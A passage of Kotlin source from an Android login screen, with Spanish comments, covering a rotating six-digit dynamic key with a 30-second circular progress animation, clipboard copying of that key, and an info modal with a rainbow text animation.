                android.util.Log.e("LoginActivity", "Error verificando usuario: ${e.message}", e)
                mostrarErrorConImagen()
                
                // Restaurar botón
                btnLogin.alpha = 1f
                dollarBox.alpha = 1f
                btnLogin.text = "Entra"
                progressBar.visibility = View.GONE
            }
        }
    }
    
    // ============ FUNCIONES PARA CLAVE DINÁMICA ============
    
    private fun setupDynamicKey() {
        generateNewDynamicKey()
        // Comenzar con el progreso oculto
        circleProgress.visibility = View.GONE
        startCircleAnimation()
    }
    
    private fun generateNewDynamicKey() {
        currentDynamicKey = (100000..999999).random().toString()
        dynamicDigits.text = currentDynamicKey
    }
    
    private fun startCircleAnimation() {
        // Cancelar animaciones anteriores
        circleProgress.animate().cancel()
        progressAnimator?.cancel()
        
        // Mostrar el progreso
        circleProgress.visibility = View.VISIBLE
        circleProgress.rotation = -90f // Punto fijo desde arriba (12 en punto)
        
        // Crear drawable dinámico
        val drawable = GradientDrawable().apply {
            shape = GradientDrawable.OVAL
            setColor(android.graphics.Color.TRANSPARENT)
        }
        circleProgress.background = drawable
        
        // Animación del círculo sincronizada con el cambio de clave
        progressAnimator = ValueAnimator.ofFloat(0f, 1f).apply {
            duration = 30000 // 30 segundos para llenar el círculo
            
            addUpdateListener { animation ->
                val progress = animation.animatedValue as Float
                
                // NO rotar el view - mantener punto fijo arriba
                // Solo incrementar el tamaño de la cola (dash)
                // Calcular circunferencia real del círculo (π × diámetro)
                val diameter = 28f // 28dp
                val circumference = kotlin.math.PI.toFloat() * diameter // ≈ 87.96dp
                val dashWidth = progress * circumference // Crece de 0dp a la circunferencia completa
                val dashGap = circumference * 2 // Gap suficiente para una sola cola
                
                // Actualizar el stroke con dash progresivo
                val strokeWidthPx = (3 * resources.displayMetrics.density).toInt()
                drawable.setStroke(
                    strokeWidthPx,
                    android.graphics.Color.parseColor("#d90080"),
                    (dashWidth * resources.displayMetrics.density),
                    (dashGap * resources.displayMetrics.density)
                )
            }
            
            addListener(object : android.animation.Animator.AnimatorListener {
                override fun onAnimationStart(animation: android.animation.Animator) {}
                override fun onAnimationCancel(animation: android.animation.Animator) {}
                override fun onAnimationRepeat(animation: android.animation.Animator) {}
                
                override fun onAnimationEnd(animation: android.animation.Animator) {
                    // Cuando termine el círculo, cambiar la clave y reiniciar
                    circleProgress.visibility = View.GONE
                    generateNewDynamicKey()
                    
                    // Esperar un momento antes de reiniciar
                    Handler(Looper.getMainLooper()).postDelayed({
                        startCircleAnimation()
                    }, 500)
                }
            })
            
            start()
        }
    }
    

    
    private fun copyDynamicKeyToClipboard() {
        try {
            val clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clipData = ClipData.newPlainText("Clave Dinámica", currentDynamicKey)
            clipboardManager.setPrimaryClip(clipData)
            
            Toast.makeText(this, "Clave copiada: $currentDynamicKey", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Log.e("LoginActivity", "Error copiando clave dinámica: ${e.message}", e)
            Toast.makeText(this, "Error al copiar la clave", Toast.LENGTH_SHORT).show()
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        // Cancelar animaciones al destruir la actividad
        circleProgress.animate().cancel()
        progressAnimator?.cancel()
        detenerAnimacionRainbow()
    }
    
    // ============ FUNCIONES PARA LA VENTANA MODAL ============
    
    private fun mostrarModalInfoApp() {
        try {
            // Mostrar la ventana modal con animación
            modalInfoApp.visibility = View.VISIBLE
            modalInfoApp.alpha = 0f
            modalInfoApp.animate()
                .alpha(1f)
                .setDuration(300)
                .withEndAction {
                    // Iniciar animación rainbow después de mostrar el modal
                    iniciarAnimacionRainbow()
                }
                .start()
            
            Log.d("ModalInfoApp", "✅ Ventana modal de información mostrada")
        } catch (e: Exception) {
            Log.e("ModalInfoApp", "❌ Error mostrando ventana modal: ${e.message}", e)
        }
    }
    
    private fun ocultarModalInfoApp() {
        try {
            // Ocultar la ventana modal con animación
            modalInfoApp.animate()
                .alpha(0f)
                .setDuration(300)
                .withEndAction {
                    modalInfoApp.visibility = View.GONE
                    detenerAnimacionRainbow() // Detener animación al ocultar
                }
                .start()
            
            Log.d("ModalInfoApp", "✅ Ventana modal de información ocultada")
        } catch (e: Exception) {
            Log.e("ModalInfoApp", "❌ Error ocultando ventana modal: ${e.message}", e)
        }
    }
    
    // Función para animación rainbow en "The Boss"
    private fun iniciarAnimacionRainbow() {
        val colors = intArrayOf(
            android.graphics.Color.parseColor("#FF0000"), // Rojo
            android.graphics.Color.parseColor("#FF7F00"), // Naranja
            android.graphics.Color.parseColor("#FFFF00"), // Amarillo
            android.graphics.Color.parseColor("#00FF00"), // Verde
            android.graphics.Color.parseColor("#0000FF"), // Azul
            android.graphics.Color.parseColor("#4B0082"), // Índigo
            android.graphics.Color.parseColor("#9400D3")  // Violeta
        )
        
        rainbowAnimator = ValueAnimator.ofInt(*colors).apply {
            duration = 2000 // 2 segundos para completar el ciclo
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.RESTART
            interpolator = android.view.animation.LinearInterpolator()
            
            addUpdateListener { animator ->
                val color = animator.animatedValue as Int
                tvTheBoss.setTextColor(color)
            }
        }
        
        rainbowAnimator?.start()
    }
    
    private fun detenerAnimacionRainbow() {
        rainbowAnimator?.cancel()
        rainbowAnimator = null
    }
} 